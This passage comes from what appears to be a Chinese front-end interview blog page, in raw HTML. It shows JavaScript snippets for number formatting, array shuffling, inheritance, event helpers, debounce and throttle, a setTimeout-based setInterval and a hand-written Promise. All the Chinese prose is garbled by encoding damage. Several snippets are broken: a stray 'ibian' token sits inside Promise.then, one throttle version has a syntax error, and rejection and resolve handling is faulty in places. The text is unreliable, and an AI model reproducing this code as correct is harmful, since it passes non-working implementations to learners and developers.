class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>Intl</code> å¯¹è±¡æ˜¯ ECMAScript å›½é™…åŒ– API çš„ä¸€ä¸ªå‘½åç©ºé—´ï¼Œå®ƒæä¾›äº†ç²¾ç¡®çš„å­—ç¬¦ä¸²å¯¹æ¯”ã€‚<code>Intl.NumberFormat</code>ç”¨äºå¯ç”¨è¯­è¨€æ•æ„Ÿæ•°å­—æ ¼å¼çš„å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚NumberFormat()ä¸ºç©ºå°±é»˜è®¤è‹±ç¾åœ°åŒºæ•°å­—è¡¨è¾¾æ–¹å¼ã€‚</p></li><li><p>```js<br>function format1(number) {<br>  return Intl.NumberFormat().format(number)<br>}</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- `toLocaleString()` æ–¹æ³•è¿”å›è¯¥å¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²æ ¼å¼å› ä¸åŒè¯­è¨€è€Œä¸åŒã€‚</span><br><span class="line"></span><br><span class="line">  ```js</span><br><span class="line">  function format2(number) &#123;</span><br><span class="line">    return number.toLocaleString(&#x27;en&#x27;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="å¦‚ä½•å®ç°æ•°ç»„çš„éšæœºæ’åºï¼Ÿ"><a href="#å¦‚ä½•å®ç°æ•°ç»„çš„éšæœºæ’åºï¼Ÿ" class="headerlink" title="å¦‚ä½•å®ç°æ•°ç»„çš„éšæœºæ’åºï¼Ÿ"></a>å¦‚ä½•å®ç°æ•°ç»„çš„éšæœºæ’åºï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ï¼ˆ1ï¼‰ä½¿ç”¨æ•°ç»„ sort æ–¹æ³•å¯¹æ•°ç»„å…ƒç´ éšæœºæ’åºï¼Œè®© Math.random() å‡ºæ¥çš„æ•°ä¸ 0.5 æ¯”è¾ƒï¼Œå¦‚æœå¤§äºå°±è¿”å› 1 äº¤æ¢ä½ç½®ï¼Œå¦‚æœå°äºå°±è¿”å› -1ï¼Œä¸äº¤æ¢ä½ç½®ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomSort</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.random() &gt; <span class="number">0.5</span> ? -<span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  ç¼ºç‚¹ï¼šæ¯ä¸ªå…ƒç´ è¢«æ´¾åˆ°æ–°æ•°ç»„çš„ä½ç½®ä¸æ˜¯éšæœºçš„ï¼ŒåŸå› æ˜¯ sort() æ–¹æ³•æ˜¯ä¾æ¬¡æ¯”è¾ƒçš„ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ï¼ˆ2ï¼‰éšæœºä»åŸæ•°ç»„æŠ½å–ä¸€ä¸ªå…ƒç´ ï¼ŒåŠ å…¥åˆ°æ–°æ•°ç»„</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = [];</span><br><span class="line">  <span class="keyword">while</span> (arr.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> randomIndex = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * arr.length);</span><br><span class="line">    result.push(arr[randomIndex]);</span><br><span class="line">    arr.splice(randomIndex, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ï¼ˆ3ï¼‰éšæœºäº¤æ¢æ•°ç»„å†…çš„å…ƒç´ ï¼ˆæ´—ç‰Œç®—æ³•ç±»ä¼¼ï¼‰</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomSort</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> length = array.length;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">Array</span>.isArray(array) || length &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; length - <span class="number">1</span>; index++) &#123;</span><br><span class="line">    <span class="keyword">let</span> randomIndex = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (length - index)) + index;</span><br><span class="line">    [array[index], array[randomIndex]] = [array[randomIndex], array[index]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¯„ç”Ÿå¼ç»„åˆç»§æ‰¿çš„å®ç°ï¼Ÿ"><a href="#å¯„ç”Ÿå¼ç»„åˆç»§æ‰¿çš„å®ç°ï¼Ÿ" class="headerlink" title="å¯„ç”Ÿå¼ç»„åˆç»§æ‰¿çš„å®ç°ï¼Ÿ"></a>å¯„ç”Ÿå¼ç»„åˆç»§æ‰¿çš„å®ç°ï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;My name is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Student</span>(<span class="params">name, grade</span>) </span>&#123;</span><br><span class="line">  Person.call(<span class="built_in">this</span>, name);</span><br><span class="line">  <span class="built_in">this</span>.grade = grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student.prototype = <span class="built_in">Object</span>.create(Person.prototype);</span><br><span class="line">Student.prototype.constructor = Student;</span><br><span class="line"></span><br><span class="line">Student.prototype.sayMyGrade = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;My grade is &quot;</span> + <span class="built_in">this</span>.grade + <span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å†™ä¸€ä¸ªé€šç”¨çš„äº‹ä»¶ä¾¦å¬å™¨å‡½æ•°"><a href="#å†™ä¸€ä¸ªé€šç”¨çš„äº‹ä»¶ä¾¦å¬å™¨å‡½æ•°" class="headerlink" title="å†™ä¸€ä¸ªé€šç”¨çš„äº‹ä»¶ä¾¦å¬å™¨å‡½æ•°"></a>å†™ä¸€ä¸ªé€šç”¨çš„äº‹ä»¶ä¾¦å¬å™¨å‡½æ•°</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> EventUtils = &#123;</span><br><span class="line">  <span class="comment">// è§†èƒ½åŠ›åˆ†åˆ«ä½¿ç”¨dom0||dom2||IEæ–¹å¼ æ¥ç»‘å®šäº‹ä»¶</span></span><br><span class="line">  <span class="comment">// æ·»åŠ äº‹ä»¶</span></span><br><span class="line">  <span class="attr">addEvent</span>: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.addEventListener) &#123;</span><br><span class="line">      element.addEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</span><br><span class="line">      element.attachEvent(<span class="string">&quot;on&quot;</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">&quot;on&quot;</span> + type] = handler;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç§»é™¤äº‹ä»¶</span></span><br><span class="line">  <span class="attr">removeEvent</span>: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.removeEventListener) &#123;</span><br><span class="line">      element.removeEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.detachEvent) &#123;</span><br><span class="line">      element.detachEvent(<span class="string">&quot;on&quot;</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">&quot;on&quot;</span> + type] = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è·å–äº‹ä»¶ç›®æ ‡</span></span><br><span class="line">  <span class="attr">getTarget</span>: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event.target || event.srcElement;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è·å– event å¯¹è±¡çš„å¼•ç”¨ï¼Œå–åˆ°äº‹ä»¶çš„æ‰€æœ‰ä¿¡æ¯ï¼Œç¡®ä¿éšæ—¶èƒ½ä½¿ç”¨ event</span></span><br><span class="line">  <span class="attr">getEvent</span>: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event || <span class="built_in">window</span>.event;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// é˜»æ­¢äº‹ä»¶ï¼ˆä¸»è¦æ˜¯äº‹ä»¶å†’æ³¡ï¼Œå› ä¸º IE ä¸æ”¯æŒäº‹ä»¶æ•è·ï¼‰</span></span><br><span class="line">  <span class="attr">stopPropagation</span>: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.stopPropagation) &#123;</span><br><span class="line">      event.stopPropagation();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å–æ¶ˆäº‹ä»¶çš„é»˜è®¤è¡Œä¸º</span></span><br><span class="line">  <span class="attr">preventDefault</span>: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.preventDefault) &#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.returnValue = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å®ç°-js-çš„èŠ‚æµä¸é˜²æŠ–"><a href="#å®ç°-js-çš„èŠ‚æµä¸é˜²æŠ–" class="headerlink" title="å®ç° js çš„èŠ‚æµä¸é˜²æŠ–"></a>å®ç° js çš„èŠ‚æµä¸é˜²æŠ–</h2><p>å‡½æ•°é˜²æŠ–ï¼š åœ¨äº‹ä»¶è¢«è§¦å‘ n ç§’åå†æ‰§è¡Œå›è°ƒï¼Œå¦‚æœåœ¨è¿™ n ç§’å†…äº‹ä»¶åˆè¢«è§¦å‘ï¼Œåˆ™é‡æ–°è®¡æ—¶ã€‚å®Œæ•´ç‰ˆå¯ä»¥å‚è€ƒ<a href="https://github.com/mqyqingfeng/Blog/issues/22">JavaScriptä¸“é¢˜ä¹‹è·Ÿç€underscoreå­¦é˜²æŠ–</a>ã€‚</p><p>å‡½æ•°èŠ‚æµï¼š è§„å®šä¸€ä¸ªå•ä½æ—¶é—´ï¼Œåœ¨è¿™ä¸ªå•ä½æ—¶é—´å†…ï¼Œåªèƒ½æœ‰ä¸€æ¬¡è§¦å‘äº‹ä»¶çš„å›è°ƒå‡½æ•°æ‰§è¡Œï¼Œå¦‚æœåœ¨åŒä¸€ä¸ªå•ä½JavaScriptä¸“é¢˜ä¹‹è·Ÿç€underscoreå­¦é˜²æŠ–æ—¶é—´å†…æŸäº‹ä»¶è¢«è§¦å‘å¤šæ¬¡ï¼Œåªæœ‰ä¸€æ¬¡èƒ½ç”Ÿæ•ˆã€‚å®Œæ•´ç‰ˆå¯ä»¥å‚è€ƒ<a href="https://github.com/mqyqingfeng/Blog/issues/26">JavaScriptä¸“é¢˜ä¹‹è·Ÿç€underscoreå­¦èŠ‚æµ</a>ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å‡½æ•°é˜²æŠ–çš„å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, delay</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="built_in">this</span>, args = <span class="built_in">arguments</span>;</span><br><span class="line">    <span class="comment">// å¦‚æœæ­¤æ—¶å­˜åœ¨å®šæ—¶å™¨çš„è¯ï¼Œåˆ™å–æ¶ˆä¹‹å‰çš„å®šæ—¶å™¨é‡æ–°è®°æ—¶</span></span><br><span class="line">    <span class="keyword">if</span> (timer) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">      timer = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è®¾ç½®å®šæ—¶å™¨ï¼Œä½¿äº‹ä»¶é—´éš”æŒ‡å®šäº‹ä»¶åæ‰§è¡Œ</span></span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      fn.apply(context, args);</span><br><span class="line">    &#125;, delay);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°èŠ‚æµçš„å®ç°ä¸€ï¼ˆæ—¶é—´æˆ³ï¼‰;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fn, delay</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> preTime = <span class="built_in">Date</span>.now();</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="built_in">this</span>, args = <span class="built_in">arguments</span>, nowTime = <span class="built_in">Date</span>.now();</span><br><span class="line">    <span class="comment">// å¦‚æœä¸¤æ¬¡æ—¶é—´é—´éš”è¶…è¿‡äº†æŒ‡å®šæ—¶é—´ï¼Œåˆ™æ‰§è¡Œå‡½æ•°ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> (nowTime - preTime &gt;= delay) &#123;</span><br><span class="line">      fn.apply(context, args);</span><br><span class="line">      preTime = <span class="built_in">Date</span>.now();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°èŠ‚æµçš„å®ç°äºŒï¼ˆå®šæ—¶å™¨ï¼‰;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fn,delay</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> valid=<span class="literal">true</span>, context = <span class="built_in">this</span>, args = <span class="built_in">arguments</span>, </span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!valid)&#123;</span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">        &#125;</span><br><span class="line">        valid=<span class="literal">false</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            fn.apply(context,args)</span><br><span class="line">            valid=<span class="literal">true</span></span><br><span class="line">        &#125;,delay)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¸ºä»€ä¹ˆä½¿ç”¨-setTimeout-å®ç°-setIntervalï¼Ÿæ€ä¹ˆæ¨¡æ‹Ÿï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨-setTimeout-å®ç°-setIntervalï¼Ÿæ€ä¹ˆæ¨¡æ‹Ÿï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨ setTimeout å®ç° setIntervalï¼Ÿæ€ä¹ˆæ¨¡æ‹Ÿï¼Ÿ"></a>ä¸ºä»€ä¹ˆä½¿ç”¨ setTimeout å®ç° setIntervalï¼Ÿæ€ä¹ˆæ¨¡æ‹Ÿï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ€è·¯æ˜¯ä½¿ç”¨é€’å½’å‡½æ•°ï¼Œä¸æ–­åœ°å»æ‰§è¡Œ setTimeout ä»è€Œè¾¾åˆ° setInterval çš„æ•ˆæœ</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mySetInterval</span>(<span class="params">fn, timeout</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// æ§åˆ¶å™¨ï¼Œæ§åˆ¶å®šæ—¶å™¨æ˜¯å¦ç»§ç»­æ‰§è¡Œ</span></span><br><span class="line">  <span class="keyword">var</span> timer = &#123;</span><br><span class="line">    <span class="attr">flag</span>: <span class="literal">true</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è®¾ç½®é€’å½’å‡½æ•°ï¼Œæ¨¡æ‹Ÿå®šæ—¶å™¨æ‰§è¡Œã€‚</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">interval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (timer.flag) &#123;</span><br><span class="line">      fn();</span><br><span class="line">      <span class="built_in">setTimeout</span>(interval, timeout);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¯åŠ¨å®šæ—¶å™¨</span></span><br><span class="line">  <span class="built_in">setTimeout</span>(interval, timeout);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è¿”å›æ§åˆ¶å™¨</span></span><br><span class="line">  <span class="keyword">return</span> timer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ‰‹å†™ä¸€ä¸ª-Promise"><a href="#æ‰‹å†™ä¸€ä¸ª-Promise" class="headerlink" title="æ‰‹å†™ä¸€ä¸ª Promise"></a>æ‰‹å†™ä¸€ä¸ª Promise</h2><p>å‚è€ƒäº†**<a href="https://link.zhihu.com/?target=https://github.com/xieranmaya/blog/issues/3">å‰–æ Promise å†…éƒ¨ç»“æ„ï¼Œä¸€æ­¥ä¸€æ­¥å®ç°ä¸€ä¸ªå®Œæ•´çš„ã€èƒ½é€šè¿‡æ‰€æœ‰ Test case çš„ Promise ç±»</a>**ï¼Œå…¶ä¸­<code>ä¸åŒPromiseçš„äº¤äº’</code>é—®é¢˜ä»ä¸ºè§£å†³ï¼Œæœ‰å¾…åç»­è¡¥å……ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Promise</span>(<span class="params">executor</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="built_in">this</span>;</span><br><span class="line">  self.status = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">  self.data = <span class="literal">undefined</span>;</span><br><span class="line">  self.onResolvedCallback = [];</span><br><span class="line">  self.onRejectedCallback = [];</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">resolve</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value <span class="keyword">instanceof</span> <span class="built_in">Promise</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> value.then(resolve, reject)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// å¼‚æ­¥æ‰§è¡Œæ‰€æœ‰çš„å›è°ƒå‡½æ•°</span></span><br><span class="line">      <span class="keyword">if</span> (self.status === <span class="string">&#x27;pending&#x27;</span>) &#123;</span><br><span class="line">        self.status = <span class="string">&#x27;resolved&#x27;</span></span><br><span class="line">        self.data = value</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; self.onResolvedCallback.length; i++) &#123;</span><br><span class="line">          self.onResolvedCallback[i](value)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">reject</span>(<span class="params">reason</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// å¼‚æ­¥æ‰§è¡Œæ‰€æœ‰çš„å›è°ƒå‡½æ•°</span></span><br><span class="line">      <span class="keyword">if</span> (self.status === <span class="string">&#x27;pending&#x27;</span>) &#123;</span><br><span class="line">        self.status = <span class="string">&#x27;rejected&#x27;</span></span><br><span class="line">        self.data = reason</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; self.onRejectedCallback.length; i++) &#123;</span><br><span class="line">          self.onRejectedCallback[i](reason)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    executor(resolve, reject);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    reject(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.prototype.then = <span class="function"><span class="keyword">function</span> (<span class="params">onResolved, onRejected</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="built_in">this</span>;</span><br><span class="line">  <span class="keyword">var</span> promise2;</span><br><span class="line">  onResolved = <span class="keyword">typeof</span> onResolved === <span class="string">&#x27;function&#x27;</span> ? onResolved : <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123; <span class="keyword">return</span> value &#125;;</span><br><span class="line">  onRejected = <span class="keyword">typeof</span> onRejected === <span class="string">&#x27;function&#x27;</span> ? onRejected : <span class="function"><span class="keyword">function</span> (<span class="params">reason</span>) </span>&#123; <span class="keyword">return</span> reason &#125;;</span><br><span class="line">  <span class="keyword">if</span> (self.status === <span class="string">&#x27;resolved&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> promise2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="comment">// å¼‚æ­¥æ‰§è¡ŒonResolved</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> x = onResolved(self.data);</span><br><span class="line">          <span class="keyword">if</span> (x <span class="keyword">instanceof</span> <span class="built_in">Promise</span>) &#123;</span><br><span class="line">            x.then(resolve, reject);</span><br><span class="line">          &#125; ibian</span><br><span class="line">          resolve(x)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">          reject(e)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">     &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (self.status === <span class="string">&#x27;rejected&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> promise2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// å¼‚æ­¥æ‰§è¡ŒonRejected</span></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> x = onRejected(self.data);</span><br><span class="line">        <span class="keyword">if</span> (x <span class="keyword">instanceof</span> <span class="built_in">Promise</span>) &#123;</span><br><span class="line">          x.then(resolve,reject)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        reject(e)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (self.status === <span class="string">&#x27;pending&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> promise2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">      self.onResolvedCallback.push(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> x = onResolved(self.data)</span><br><span class="line">          <span class="keyword">if</span> (x <span class="keyword">instanceof</span> <span class="built_in">Promise</span>) &#123;</span><br><span class="line">            x.then(resolve, reject)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// resolve(x)</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">          reject(e)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      self.onRejectedCallback.push(<span class="function"><span class="keyword">function</span>(<span class="params">reason</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> x = onRejected(self.data)</span><br><span class="line">          <span class="keyword">if</span> (x <span class="keyword">instanceof</span> <span class="built_in">Promise</span>) &#123;</span><br><span class="line">            x.then(resolve, reject)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">          reject(e)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° catch</span></span><br><span class="line"><span class="built_in">Promise</span>.prototype.catch = <span class="function"><span class="keyword">function</span> (<span class="params">onRejected</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.then(<span class="literal">null</span>, onRejected);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° finally</span></span><br><span class="line"><span class="built_in">Promise</span>.prototype.finally = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// è¿™é‡Œæ‰€æœ‰çš„thenè°ƒç”¨æ˜¯ä¸€èµ·çš„ï¼Œä½†æ˜¯è¿™ä¸ªthené‡Œè°ƒç”¨fnåˆå¼‚æ­¥äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥å®ƒæ€»æ˜¯æœ€åè°ƒç”¨çš„ã€‚</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(fn)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(fn)</span><br><span class="line">    <span class="keyword">throw</span> reason</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° all</span></span><br><span class="line"><span class="built_in">Promise</span>.myall = <span class="function"><span class="keyword">function</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr.length === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> resolve([])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> res = [], count = <span class="number">0</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="comment">// åŒæ—¶ä¹Ÿèƒ½å¤„ç†arræ•°ç»„ä¸­éPromiseå¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span> (!(arr[i] <span class="keyword">instanceof</span> <span class="built_in">Promise</span>)) &#123;</span><br><span class="line">          res[i] = arr[i]</span><br><span class="line">          <span class="keyword">if</span> (++count === arr.length)</span><br><span class="line">            resolve(res)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          arr[i].then(<span class="function"><span class="params">data</span> =&gt;</span> 